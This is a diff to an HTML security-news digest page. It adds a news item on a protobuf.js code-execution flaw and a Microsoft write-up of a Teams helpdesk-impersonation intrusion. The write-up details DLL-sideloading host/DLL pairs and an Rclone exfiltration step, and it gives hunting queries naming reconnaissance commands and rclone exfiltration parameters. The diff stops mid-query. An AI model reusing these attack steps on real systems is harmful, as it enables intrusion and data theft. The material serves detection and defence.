@@ -59,12 +59,165 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-04-18</h1>
+        <h1>Security Briefing // 2026-04-19</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Mirai Variant Nexcorium Exploits CVE-2024-3721 to Hijack TBK DVRs for DDoS Botnet</button></li><li><button onclick="show('art-1')">Payouts King ransomware uses QEMU VMs to bypass endpoint security</button></li><li><button onclick="show('art-2')">Containing a domain compromise: How predictive shielding shut down lateral movement</button></li><li><button onclick="show('art-3')">Mythos, Memory Loss, and the Part InfoSec Keeps Missing</button></li><li><button onclick="show('art-4')">Into The Rainbow: Google’s NTLMv1 Rainbow Tables Explained in a Bit Too Much Detail</button></li><li><button onclick="show('art-5')">Defending Your Enterprise When AI Models Can Find Vulnerabilities Faster Than Ever</button></li><li><button onclick="show('art-6')">Patch Tuesday, April 2026 Edition</button></li><li><button onclick="show('art-7')">CISA Adds Two Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-8')">CISA Adds 6 Known Exploited Flaws in Fortinet, Microsoft, and Adobe Software</button></li><li><button onclick="show('art-9')">Microsoft Patch Tuesday, March 2026 Edition</button></li></ul>
+            <ul><li><button onclick="show('art-0')">Critical flaw in Protobuf library enables JavaScript code execution</button></li><li><button onclick="show('art-1')">Cross‑tenant helpdesk impersonation to data exfiltration: A human-operated intrusion playbook</button></li><li><button onclick="show('art-2')">Mirai Variant Nexcorium Exploits CVE-2024-3721 to Hijack TBK DVRs for DDoS Botnet</button></li><li><button onclick="show('art-3')">Mythos, Memory Loss, and the Part InfoSec Keeps Missing</button></li><li><button onclick="show('art-4')">Into The Rainbow: Google’s NTLMv1 Rainbow Tables Explained in a Bit Too Much Detail</button></li><li><button onclick="show('art-5')">Patch Tuesday, April 2026 Edition</button></li><li><button onclick="show('art-6')">CISA Adds Two Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-7')">CISA Adds 6 Known Exploited Flaws in Fortinet, Microsoft, and Adobe Software</button></li><li><button onclick="show('art-8')">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</button></li><li><button onclick="show('art-9')">Microsoft Patch Tuesday, March 2026 Edition</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
+            <h2 class="article-title">Critical flaw in Protobuf library enables JavaScript code execution</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/critical-flaw-in-protobuf-library-enables-javascript-code-execution/" target="_blank">Original Link</a></p>
+            <div class="content-text">Proof-of-concept exploit code has been published for a critical remote code execution flaw in protobuf.js, a widely used JavaScript implementation of Google's Protocol Buffers.
+The tool is highly popular in the Node Package Manager (npm) registry, with an average of nearly [50 million weekly downloads](http://www.npmjs.com/package/protobufjs). It is used for inter-service communication, in real-time applications, and for efficient storage of structured data in databases and cloud environments.
+In a report on Friday, application security company Endor Labs says that the remote code execution vulnerability (RCE) in protobuf.js is caused by unsafe dynamic code generation.
+The security issue has not received an official CVE number and is currently being tracked as GHSA-xq3m-2v4x-88gg, the identifier assigned by GitHub.
+[Endor Labs explains](https://www.endorlabs.com/learn/the-dangers-of-reusing-protobuf-definitions-critical-code-execution-in-protobuf-js-ghsa-xq3m-2v4x-88gg) that the library builds JavaScript functions from protobuf schemas by concatenating strings and executing them via the Function() constructor, but it fails to validate schema-derived identifiers, such as message names.
+This lets an attacker supply a malicious schema that injects arbitrary code into the generated function, which is then executed when the application processes a message using that schema.
+This opens the path to RCE on servers or applications that load attacker-influenced schemas, granting access to environment variables, credentials, databases, and internal systems, and even allowing lateral movement within the infrastructure.
+The attack could also affect developer machines if those load and decode untrusted schemas locally.
+The flaw impacts protobuf.js versions 8.0.0/7.5.4 and lower. Endor Labs recommends upgrading to 8.0.1 and 7.5.5, which address the issue.
+The patch sanitizes type names by stripping non-alphanumeric characters, preventing the attacker from closing the synthetic function. However, Endor comments that a longer-term fix would be to stop round-tripping attacker-reachable identifiers through Function at all.
+Endor Labs is warning that “exploitation is straightforward,” and that the minimal proof-of-concept (PoC) included in the [security advisory](https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-xq3m-2v4x-88gg) reflects this. However, no active exploitation in the wild has been observed to date.
+The vulnerability was reported by Endor Labs researcher and security bug bounty hunter [Cristian Staicu](https://github.com/cristianstaicu) on March 2, and the protobuf.js maintainers released a patch on GitHub on March 11. Fixes to the npm packages were made available on April 4 for the 8.x branch and on April 15 for the 7.x branch.
+Apart from upgrading to patched versions, Endor Labs also recommends that system administrators audit transitive dependencies, treat schema-loading as untrusted input, and prefer precompiled/static schemas in production.
+[99% of What Mythos Found Is Still Unpatched.](https://hubs.li/Q04crVgD0)
+AI chained four zero-days into one exploit that bypassed both renderer and OS sandboxes. A wave of new exploits is coming.
+At the Autonomous Validation Summit (May 12 & 14), see how autonomous, context-rich validation finds what's exploitable, proves controls hold, and closes the remediation loop.
+Post a Comment Community Rules
+You need to login in order to post a comment
+Not a member yet? Register Now</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-1" class="article-body">
+            <h2 class="article-title">Cross‑tenant helpdesk impersonation to data exfiltration: A human-operated intrusion playbook</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/04/18/crosstenant-helpdesk-impersonation-data-exfiltration-human-operated-intrusion-playbook/" target="_blank">Original Link</a></p>
+            <div class="content-text">Threat actors are initiating cross-tenant Microsoft Teams communications while impersonating IT or helpdesk personnel to socially engineer users into granting remote desktop access. After access is established through Quick Assist or similar remote support tools, attackers often execute trusted vendor-signed applications alongside attacker-supplied modules to enable malicious code execution.
+This access pathway might be used to perform credential-backed lateral movement using native administrative protocols such as Windows Remote Management (WinRM), allowing threat actors to pivot toward high-value assets including domain controllers. In observed intrusions, follow-on commercial remote management software and data transfer utilities such as Rclone were used to expand access across the enterprise environment and stage business-relevant information for transfer to external cloud storage. This intrusion chain relies heavily on legitimate applications and administrative protocols, allowing threat actors to blend into expected enterprise activity during multiple intrusion phases.
+Threat actors are increasingly abusing external Microsoft Teams collaboration to impersonate IT or helpdesk personnel and convince users to grant remote assistance access. From this initial foothold, attackers can leverage trusted tools and native administrative protocols to move laterally across the enterprise and stage sensitive data for exfiltration—often blending into routine IT support activity throughout the intrusion lifecycle. Microsoft Defender provides correlated visibility across identity, endpoint, and collaboration telemetry to help detect and disrupt this user‑initiated access pathway before it escalates into broader compromise.
+Risk to enterprise environments
+By abusing enterprise collaboration workflows instead of traditional email‑based phishing channels, attackers may initiate contact through applications such as Microsoft Teams in a way that appears consistent with routine IT support interactions. While Teams includes built‑in security features such as external‑sender labeling and Accept/Block prompts, this attack chain relies on convincing users to bypass those warnings and voluntarily grant remote access through legitimate support tools.
+In observed intrusions, risk is introduced not by external messaging alone, but when a user approves follow‑on actions — such as launching a remote assistance session — that result in interactive system access.
+An approved external Teams interaction might enable threat actors to:
+- Establish credential-backed interactive system access
+- Deploy trusted applications to execute attacker-controlled code
+- Pivot toward identity and domain infrastructure using WinRM
+- Deploy commercially available remote management tooling
+- Stage sensitive business-relevant data for transfer to external cloud infrastructure
+In the campaign, lateral movement and follow-on tooling installation occurred shortly after initial access, increasing the risk of enterprise-wide persistence and targeted data exfiltration. As each environment is different and with potential handoff to different threat actors, stages might differ if not outright bypassed.
+Attack chain overview
+Stage 1: Initial contact via Teams (T1566.003 Spearphishing via Service)
+The intrusion begins with abuse of external collaboration features in Microsoft Teams, where an attacker operating from a separate tenant initiates contact while impersonating internal support personnel as a means to social engineer the user. Because interaction occurs within an enterprise collaboration platform rather than through traditional email‑based phishing vectors, it might bypass initial user skepticism associated with unsolicited external communication. Security features protecting Teams users are detailed [here](https://learn.microsoft.com/en-us/microsoftteams/teams-security-guide), for reference. It’s important to note that this attack relies on users willfully ignoring or overlooking security notices and other protection features. The lure varies and might include “Microsoft Security Update”, “Spam Filter Update”, “Account Verification” but the objective is constant: convince the user to ignore warnings and external contact flags, launch a remote management session, and accept elevation. Voice phishing (vishing) is sometimes layered to increase trust or compliance if they don’t replace the messaging altogether.
+Timing matters. We regularly see a “ChatCreated” event to indicate a first contact situation, followed by suspicious chats or vishing, remote management, and other events t that commonly produce alerts to include mailbombing or URL click alerts. All of these can be correlated by account and chat thread information in your Defender hunting environment.
+Teams security warnings:
+External Accept/Block screens provide notice to users about First Contact events, which prompt the user to inspect the sender’s identity before accepting:
+Higher confidence warnings alert the user of spam or phishing attempts on first contact:
+External warnings notify users that they are communicating with a tenant/organization other than their own and should be treated with scrutiny:
+Message warnings alert the user on the risk in clicking the URL:
+Safe Links for time-of-click protection warns users when URLs from Teams chat messages are malicious:
+Zero-hour Auto Purge (ZAP) can remove messages that were flagged as malicious after they have been sent:
+It’s important to note that the attacker often does not send the URL over a Teams message. Instead, they will navigate to it while on the endpoint during a remote management session. Therefore, the best security is user education on understanding the importance of not ignoring external flags for new helpdesk contacts. See “User education” in the “Defend, harden, and educate (Controls to deploy now)” section for further advice.
+Stage 2: Remote assistance foothold
+With user consent obtained through social engineering, the attacker gains interactive control of the device using remote support tools such as Quick Assist. This access typically results in the launch of QuickAssist.exe, followed by the display of standard Windows elevation prompts through Consent.exe as the attacker is guided through approval steps.
+From the user’s perspective, the attacker convinces them to open Quick Assist, enter a short key, the follow all prompts and approvals to grant access.
+This step is often completed in under a minute. The urgency and interactivity are the signal: a remote‑assist process tree followed immediately by “cmd.exe” or PowerShell on the same desktop.
+Stage 3: Interactive reconnaissance and access validation
+Immediately after establishing control through Quick Assist, the attacker typically spends the first 30–120 seconds assessing their level of access and understanding the compromised environment. This is often reflected by a brief surge of cmd.exe activity, used to verify user context and privilege levels, gather basic system information such as host identity and operating system details, and confirm domain affiliation. In parallel, the attacker might query registry values to determine OS build and edition, while also performing quick network reconnaissance to evaluate connectivity, reachability, and potential opportunities for lateral movement.
+On systems with limited privileges—such as kiosks, VDI, or non-corp-joined devices—actors might pause without deploying payloads, leaving only brief reconnaissance activity. They often return later when access improves or pivot to other targets within the same tenant.
+Stage 4: Payload placement and trusted application invocation
+Once remote access is established, the intrusion transitions from user‑assisted interaction to preparing the environment for persistent execution. At this point, attackers introduce a small staging bundle onto disk using either archive‑based deployment or short‑lived scripting activity.
+After access is established, attackers stage payloads in locations such as ProgramData and execute them using DLL side‑loading through trusted signed applications. This includes:
+- AcroServicesUpdater2_x64.exe loading a staged msi.dll
+- ADNotificationManager.exe loading vcruntime140_1.dll
+- DlpUserAgent.exe loading mpclient.dll
+- werfault.exe loading Faultrep.dll
+Allowing attacker‑supplied modules to run under a trusted execution context from non‑standard paths.
+Stage 5: Execution context validation and registry backed loader state
+Following payload delivery, the attacker performs runtime checks to validate host conditions before execution. A large encoded value is then written to a user‑context registry location, serving as a staging container for encrypted configuration data to be retrieved later at runtime.
+In this stage, a sideloaded module acting as an intermediary loader decrypts staged registry data in memory to reconstruct execution and C2 configuration without writing files to disk. This behavior aligns with intrusion frameworks such as Havoc, which externalize encrypted configuration to registry storage, allowing trusted sideloaded components to dynamically recover execution context and maintain operational continuity across restarts or remediation events.
+Microsoft Defender for Endpoint may detect this activity as:
+- Unexpected DLL load by trusted application
+- Service‑path execution outside vendor installation directory
+- Execution from user‑writable directories such as ProgramData
+Attack surface reduction rules and Windows Defender Application Control policies can be used to restrict execution pathways commonly leveraged for sideloaded module activation.
+Stage 6: Command and control
+Following successful execution of the sideloaded component, the updater‑themed process AcroServicesUpdater2_x64.exe began initiating outbound HTTPS connections over TCP port 443 to externally hosted infrastructure.
+Unlike expected application update workflows which are typically restricted to known vendor services these connections were directed toward dynamically hosted cloud‑backed endpoints and unknown external domains. This behavior indicates remote attacker‑controlled infrastructure rather than legitimate update mechanisms.
+Establishing outbound encrypted communications in this manner enables compromised processes to operate as beaconing implants, allowing adversaries to remotely retrieve instructions and maintain control within the affected environment while blending command traffic into routine HTTPS activity. The use of cloud‑hosted hosting layers further reduces infrastructure visibility and improves the attacker’s ability to modify or rotate communication endpoints without altering the deployed payload.
+This activity marks the transition from local execution to externally directed command‑and‑control — enabling subsequent stages of discovery and movement inside the enterprise network.
+Stage 7: Internal discovery and lateral movement toward high value assets
+Shortly after external communications were established, the compromised process began initiating internal remote management connections over WinRM (TCP 5985) toward additional domain‑joined systems within the enterprise environment.
+Microsoft Defender may surface these activities as multi‑device incidents reflecting credential‑backed lateral movement initiated from a user‑context remote session.
+Analysis of WinRM activity indicates that the threat actor used native Windows remote execution to pivot from the initially compromised endpoint toward high‑value infrastructure assets, including identity and domain management systems such as domain controllers. Use of WinRM from a non‑administrative application suggests credential‑backed lateral movement directed by an external operator, enabling remote command execution, interaction with domain infrastructure, and deployment of additional tooling onto targeted hosts.
+Targeting identity‑centric infrastructure at this stage reflects a shift from initial foothold to broader enterprise control and persistence. Notably, this internal pivot preceded the remote deployment of additional access tooling in later stages, indicating that attacker‑controlled WinRM sessions were subsequently leveraged to extend sustained access across
+| Protocol: “HTTP” Entity Type: “IP” Ip: <IP Address> Target: “http://host.domain.local:5985/wsman” RequestUserAgent: “Microsoft WinRM Client” |
+Stage 8: Remote deployment of auxiliary access tooling (Level RMM)
+Subsequent activity revealed the remote installation of an additional management platform across compromised hosts using Windows Installer (msiexec.exe). This introduced an alternate control channel independent of the original intrusion components, reducing reliance on the initial implant and enabling sustained access through standard administrative mechanisms. As a result, attackers could maintain persistent remote control even if earlier payloads were disrupted or removed.
+Stage 9: Data exfiltration
+Actors used the file‑synchronization tool Rclone to transfer data from internal network locations to an external cloud storage service. File‑type exclusions in the transfer parameters suggest a targeted effort to exfiltrate business‑relevant documents while minimizing transfer size and detection risk.
+Microsoft Defender might detect this activity as possible data exfiltration involving uncommon synchronization tooling.
+Mitigation and protection guidance
+| Family / Product | Protection | Reference documents |
+| Microsoft Teams | Review external collaboration policies and ensure users receive clear external sender notifications when interacting with cross‑tenant contacts. Consider device‑ or identity‑based access requirements prior to granting remote support sessions. |
+|
+[https://learn.microsoft.com/en-us/defender-office-365/safe-links-about](https://learn.microsoft.com/en-us/defender-office-365/safe-links-about)[https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference)[https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview](https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview)and[https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-overview](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-overview)and[https://learn.microsoft.com/en-us/defender-xdr/custom-detections-overview](https://learn.microsoft.com/en-us/defender-xdr/custom-detections-overview)[https://learn.microsoft.com/en-us/defender-endpoint/network-protection](https://learn.microsoft.com/en-us/defender-endpoint/network-protection)[Disrupting threats targeting Microsoft Teams | Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2025/10/07/disrupting-threats-targeting-microsoft-teams/)Microsoft protection outcomes
+| Family / Product | Protection in addition to detections. | Reference Documents |
+| AI driven detection & attack disruption | When Defender detects credential‑backed WinRM lateral movement following a Quick Assist session, Automatic Attack Disruption can suspend the originating user session and contain the users prior to domain‑controller interaction — limiting lateral movement before your SOC engages. Look for incidents tagged “Attack Disruption” in your queue. |
+|
+[https://learn.microsoft.com/en-us/defender-xdr/incident-queue](https://learn.microsoft.com/en-us/defender-xdr/incident-queue)[https://learn.microsoft.com/en-us/defender-xdr/threat-analytics](https://learn.microsoft.com/en-us/defender-xdr/threat-analytics)[https://learn.microsoft.com/en-us/microsoftteams/teams-security-best-practices-for-safer-messaging](https://learn.microsoft.com/en-us/microsoftteams/teams-security-best-practices-for-safer-messaging)[https://learn.microsoft.com/en-us/defender-vulnerability-management/tvm-security-recommendation](https://learn.microsoft.com/en-us/defender-vulnerability-management/tvm-security-recommendation)Microsoft Defender XDR detections
+Microsoft Defender provides pre-breach and post-breach coverage for this campaign, supported by the generic and specific alerts listed below.
+| Tactic | Observed activity | Microsoft Defender coverage |
+| Initial Access | The actor initiates a cross‑tenant Teams chat or call from an often newly created tenant using an IT/Help‑Desk persona | Microsoft Defender for Office 365 – Microsoft Teams chat initiated by a suspicious external user – IT Support Teams Voice phishing following mail bombing activity – A user clicked through to a potentially malicious URL. – A potentially malicious URL click was detected. Microsoft Defender for Endpoint – Possible initial access from an emerging threat |
+| Execution | The attacker gains interactive control via remote management tools to include Quick Assist. | Microsoft Defender for Endpoint – Suspicious activity using Quick Assist – Uncommon remote access software – Remote monitoring and management software suspicious activity Microsoft Defender Antivirus – Trojan:Win64/DllHijack.VGA!MTB – Trojan:Win64/DllHijack.VGB!MTB – Trojan:Win64/Tedy!MTB – Trojan.Win64.Malgent – Trojan:Win64/Zusy!MTB |
+| Lateral Movement | Attacker pivots via WinRM to target high￼value assets (e.g., domain controllers). | Microsoft Defender for Endpoint – Suspicious sign-in activity – Potential human-operated malicious activity – Hands-on-keyboard attack involving multiple devices |
+| Persistence | Runtime environment validated and encoded loader state stored within user registry. | Microsoft Defender for Endpoint – Suspicious registry modification |
+| Defense Evasion & Privilege Escalation | DLL Side-Loading (e.g., AcroServicesUpdater2_x64.exe, ADNotificationManager.exe, or DlpUserAgent.exe) | Microsoft Defender for Endpoint – An executable file loaded an unexpected DLL file Microsoft Defender Antivirus – Trojan:Win64/DllHijack.VGA!MTB – Trojan:Win64/DllHijack.VGB!MTB – Trojan:Win64/Tedy!MTB – Trojan.Win64.Malgent – Trojan:Win64/Zusy!MTB |
+| Command & Control | The implant or sideloaded host typically beacons over HTTPS | Microsoft Defender for Endpoint – Connection to a custom network indicator – A file or network connection related to a ransomware-linked emerging threat activity group detected |
+| Data Exfiltration | Widely available file‑synchronization utility Rclone to systematically transfer data | Microsoft Defender for Endpoint – Possible data exfiltration |
+| Multi-tactic | Many alerts span across multiple tactics or stages of an attack and cover many platforms. | Microsoft Defender (All) – Multi-stage incident involving Execution – Remote management event after suspected Microsoft Teams IT support phishing – An Office application ran suspicious commands |
+Hunting queries
+Security teams can use the advanced hunting capabilities in Microsoft Defender XDR to proactively look for indicators of exploitation.
+A. Teams → RMM correlation
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 | let _timeFrame = 30m; // Teams message signal let _teams = MessageEvents | where Timestamp > ago(14d) //| where SenderDisplayName contains "add keyword" // or SenderDisplayName contains "add keyword" | extend Recipient = parse_json(RecipientDetails) | mv-expand Recipient | extend VictimAccountObjectId = tostring(Recipient.RecipientObjectId), VictimRecipientDisplayName = tostring(Recipient.RecipientUserDisplayName) | project TTime = Timestamp, SenderEmailAddress, SenderDisplayName, VictimRecipientDisplayName, VictimAccountObjectId; // RMM launches on endpoint side let _rmm = DeviceProcessEvents | where Timestamp > ago(14d) | where FileName in~ ("QuickAssist.exe", "AnyDesk.exe", "TeamViewer.exe") | extend VictimAccountObjectId = tostring(InitiatingProcessAccountObjectId) | project DeviceName, QTime = Timestamp, RmmTool = FileName, VictimAccountObjectId; _teams | where isnotempty(VictimAccountObjectId) | join kind=inner _rmm on VictimAccountObjectId | where isnotempty(DeviceName) | where QTime between ((TTime) .. (TTime +(_timeFrame))) | project DeviceName, SenderEmailAddress, SenderDisplayName, VictimRecipientDisplayName, VictimAccountObjectId, TTime, QTime, RmmTool | order by QTime desc |
+B. Execution
+1 2 3 4 5 | DeviceProcessEvents | where Timestamp > ago(7d) | where InitiatingProcessFileName =~ "cmd.exe" | where FileName =~ "cmd.exe" | where ProcessCommandLine has_all ("/S /D /c", "\" set /p=\"PK\"", "1>") |
+C. ZIP → ProgramData service path → signed host sideload
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 | let _timeFrame = 10m; let _armOrDevice = DeviceFileEvents | where Timestamp > ago(14d) | where FolderPath has_any ( "C:\\ProgramData\\Adobe\\ARM\\", "C:\\ProgramData\\Microsoft\\DeviceSync\\", "D:\\ProgramData\\Adobe\\ARM\\", "D:\\ProgramData\\Microsoft\\DeviceSync\\") and ActionType in ("FileCreated","FileRenamed") | project DeviceName, First=Timestamp, FileName; let _hostRun = DeviceProcessEvents | where Timestamp > ago(14d) | where FileName in~ ("AcroServicesUpdater2_x64.exe","DlpUserAgent.exe","ADNotificationManager.exe") | project DeviceName, Run=Timestamp, Host=FileName; _armOrDevice | join kind=inner _hostRun on DeviceName | where Run between (First .. (First+(_timeFrame))) | summarize First=min(First), Run=min(Run), Files=make_set(FileName, 10) by DeviceName, Host | order by Run desc |
+D. PowerShell → high‑risk TLD → writes %AppData%/Roaming EXE
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 | let _timeFrame = 5m; let _psNet = DeviceNetworkEvents | where Timestamp > ago(14d) | where InitiatingProcessFileName in~ ("powershell.exe","pwsh.exe") | where RemoteUrl matches regex @"(?i)\.(top|xyz|zip|click)$" | project DeviceName, NetTime=Timestamp, RemoteUrl, RemoteIP; let _exeWrite = DeviceFileEvents | where Timestamp > ago(14d) | where FolderPath has @"\AppData\Roaming\" and FileName endswith ".exe" | project DeviceName, WTime=Timestamp, FileName, FolderPath, SHA256; _psNet | join kind=inner _exeWrite on DeviceName | where WTime between (NetTime .. (NetTime+(_timeFrame))) | project DeviceName, NetTime, RemoteUrl, RemoteIP, WTime, FileName, FolderPath, SHA256 | order by WTime desc |
+E. Registry breadcrumbs / ASEP anomalies
+1 2 3 4 5 6 | DeviceRegistryEvents | where Timestamp > ago(30d) | where RegistryKey has @"\SOFTWARE\Classes\Local Settings\Software\Microsoft" | where RegistryValueName in~ ("UCID","UFID","XJ01","XJ02","UXMP") | project Timestamp, DeviceName, ActionType, RegistryKey, RegistryValueName, PreviousRegistryValueData, InitiatingProcessFileName | order by Timestamp desc |
+F. Non‑browser process → API‑Gateway → internal AD protocols
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 | let _timeFrame = 10m; let _net1 = DeviceNetworkEvents | where Timestamp > ago(14d) | where RemoteUrl has ".execute-api." | where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe") | project DeviceName, Proc=InitiatingProcessFileName, OutTime=Timestamp, RemoteUrl, RemoteIP; let _net2 = DeviceNetworkEvents | where Timestamp > ago(14d) | where RemotePort in (135,389,445,636) | project DeviceName, Proc=InitiatingProcessFileName, InTime=Timestamp, RemoteIP, RemotePort; _net1 | join kind=inner _net2 on DeviceName, Proc | where InTime between (OutTime .. (OutTime+(_timeFrame))) | project DeviceName, Proc, OutTime, RemoteUrl, InTime, RemotePort | order by InTime desc |
+G. PowerShell history deletion
+1 2 3 4 5 | DeviceFileEvents | where Timestamp > ago(14d) | where FileName =~ "ConsoleHost_history.txt" and ActionType == "FileDeleted" | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath | order by Timestamp desc |
+H. Reconnaissance burst (cmd / PowerShell)
+1 2 3 4 5 6 7 8 9 10 11 12 13 | DeviceProcessEvents | where Timestamp > ago(14d) | where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe") | where ProcessCommandLine has_any ( "whoami", "whoami /all", "whoami /groups", "whoami /priv", "hostname", "systeminfo", "ver", "wmic os get", "reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "query user", "net user", "nltest", "ipconfig /all", "arp -a", "route print", "dir", "icacls" ) | project Timestamp, DeviceName, FileName, InitiatingProcessFileName, ProcessCommandLine | summarize eventCount = count(), FileNames = make_set(FileName), InitiatingProcessFileNames = make_set(InitiatingProcessFileName), ProcessCommandLines = make_set(ProcessCommandLine, 5) by DeviceName | where eventCount > 2 |
+I. Data Exfil
+1 2 3 4 | DeviceProcessEvents | where Timestamp > ago(2d) | where FileName =~ "rclone.exe" or ProcessVersionInfoOriginalFileName =~ "rclone.exe" | where ProcessCommandLine has_all ("copy ", "--config rclone_uploader.conf", "--transfers 16", "--checkers 16", "--buffer-size 64M", "--max-age=3y", "--exclude *.mdf") |
+J. Quick Assist–anchored recon (no staging writes within 10 minutes)
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 | let _reconWindow = 10m; // common within 1-5 minutes let _stageWindow = 15m; // common 1-2 minutes after recon, or less // Anchor on RMM let _rmm = DeviceProcessEvents | where Timestamp > ago(14d) | where FileName in~ ("QuickAssist.exe", "AnyDesk.exe", "TeamViewer.exe") | project DeviceName, RMMTime=Timestamp; // Recon commands within X minutes of RMM start (targeted list) let _recon = DeviceProcessEvents | where Timestamp > ago(14d) | where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe") | where ProcessCommandLine has_any ( "whoami", "hostname", "systeminfo", "ver", "wmic os get", "reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "query user", "net user", "nltest", "ipconfig /all", "arp -a", "route print", "dir", "icacls" ) | project DeviceName, ReconTime=Timestamp, ReconCmd=ProcessCommandLine, ReconProc=FileName; // Suspect staging writes (ZIP/EXE/DLL) let _staging = DeviceFileEvents | where Timestamp > ago(14d) | where ActionType in ("FileCreated","FileRenamed") | where FileName matches regex @"(?i).*\\.(zip|exe|dll)$" | project DeviceName, STime=Timestamp, StageFile=FileName, StagePath=FolderPath; // Correlate RMM + recon, then exclude cases with staging writes in the next X minutes let _rmmRecon = _rmm | join kind=inner _recon on DeviceName | where ReconTime between (RMMTime .. (RMMTime+(_reconWindow))) | project DeviceName, RMMTime, ReconTime, ReconProc, ReconCmd; _rmmRecon | join kind=leftouter _staging on DeviceName | extend HasStagingInWindow = iff(STime between (RMMTime .. (RMMTime+(_stageWindow))), 1, 0) | summarize HasStagingInWindow=max(HasStagingInWindow) by DeviceName, RMMTime, ReconTime, ReconProc, ReconCmd | where HasStagingInWindow == 0 | project DeviceName, RMMTime, ReconTime, ReconProc, ReconCmd |
+K. Sample Correlation Query Between Chat, First Contact, and Alerts
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 | Note. Please modify or tune for your specific environment. let _timeFrame = 30m; // Tune: how long after the Teams event to look for matching alerts let _huntingWindow = 4d; // Tune: broader lookback increases coverage but also cost // Seed Teams message activity and normalize the victim/join fields you want to carry forward let _teams = materialize ( MessageEvents | where Timestamp > ago(_huntingWindow) | extend Recipient = parse_json(RecipientDetails) // Optional tuning: add sender/name/content filters here first to reduce volume early //| where SenderDisplayName contains "add keyword" // or SenderDisplayName contains "add keyword" // add other hunting terms | mv-expand Recipient | extend VictimAccountObjectId = tostring(Recipient.RecipientObjectId), VictimUPN = tostring(Recipient.RecipientSmtpAddress) | project TTime = Timestamp, SenderUPN = SenderEmailAddress, SenderDisplayName, VictimUPN, VictimAccountObjectId, ChatThreadId = ThreadId ); // Distinct key sets used to prefilter downstream tables before joining let _VictimAccountObjectId = materialize( _teams | where isnotempty(VictimAccountObjectId) | distinct VictimAccountObjectId ); let _VictimUPN = materialize( _teams | where isnotempty(VictimUPN) | distinct VictimUPN ); let _ChatThreadId = materialize( _teams | where isnotempty(ChatThreadId) | distinct ChatThreadId ); // Find first-seen chat creation events for the chat threads already present in _teams // Tune: add more CloudAppEvents filters here if you want to narrow to external / one-on-one / specific chat types let _firstContact = materialize( CloudAppEvents | where Timestamp > ago(_huntingWindow) | where Application has "Teams" | where ActionType == "ChatCreated" | extend Raw = todynamic(RawEventData) | extend ChatThreadId = tostring(Raw.ChatThreadId) | where isnotempty(ChatThreadId) | join kind=innerunique (_ChatThreadId) on ChatThreadId | summarize FCTime = min(Timestamp) by ChatThreadId ); // Alert branch 1: match by victim object ID // Usually the cleanest identity join if the field is populated consistently let _alerts_by_oid = materialize( AlertEvidence | where Timestamp > ago(_huntingWindow) | where AccountObjectId in (_VictimAccountObjectId) | project ATime = Timestamp, AlertId, Title, AccountName, AccountObjectId, AccountUpn = "", SourceId = "", ChatThreadId = "" ); // Alert branch 2: match by victim UPN // Useful when ObjectId is missing or alert evidence is only populated with UPN let _alerts_by_upn = materialize( AlertEvidence | where Timestamp > ago(_huntingWindow) | where AccountUpn in (_VictimUPN) | project ATime = Timestamp, AlertId, Title, AccountName, AccountObjectId, AccountUpn, SourceId = "", ChatThreadId = "" ); // Alert branch 3: match by chat thread ID // Tune: this is typically the most expensive branch because it inspects AdditionalFields let _alerts_by_thread = materialize( AlertEvidence | where Timestamp > ago(_huntingWindow) | where AdditionalFields has_any (_ChatThreadId) | extend AdditionalFields = todynamic(AdditionalFields) | extend SourceId = tostring(AdditionalFields.SourceId), ChatThreadIdRaw = tostring(AdditionalFields.ChatThreadId) | extend ChatThreadId = coalesce( ChatThreadIdRaw, extract(@"/(?:chats|channels|conversations|spaces)/([^/]+)/", 1, SourceId) ) | where isnotempty(ChatThreadId) | join kind=innerunique (_ChatThreadId) on ChatThreadId | project ATime = Timestamp, AlertId, Title, AccountName, AccountObjectId, AccountUpn = "", SourceId, ChatThreadId ); // // add branch 4 to corrilate with host events // // Add first-contact context back onto the Teams seed set let _teams_fc = materialize( _teams | join kind=leftouter _firstContact on ChatThreadId 